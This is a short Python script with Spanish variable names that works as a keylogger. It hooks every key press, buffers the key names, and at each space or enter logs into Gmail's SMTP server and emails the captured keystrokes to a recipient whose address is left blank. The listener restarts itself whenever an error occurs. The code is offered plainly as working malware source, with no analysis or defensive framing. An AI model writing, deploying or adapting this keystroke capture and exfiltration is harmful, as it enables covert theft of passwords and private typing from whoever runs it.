import keyboard,smtplib


palabra=[]

def ejecucion(tecla):

   
    try:
        if tecla.name == 'space' or tecla.name == 'enter':
            with smtplib.SMTP('smtp.gmail.com',587) as email:
                email.starttls()
                remitente= ''
                dest=''
                mensaje=f'Subject:script\n{''.join(palabra)}'
                email.login(remitente,'')
                email.sendmail(remitente,dest,msg=mensaje)


            palabra.clear()
            
        else:
            palabra.append(tecla.name)
    except:
        escuchando()

def escuchando():
    keyboard.on_press(ejecucion)

    keyboard.wait()
escuchando()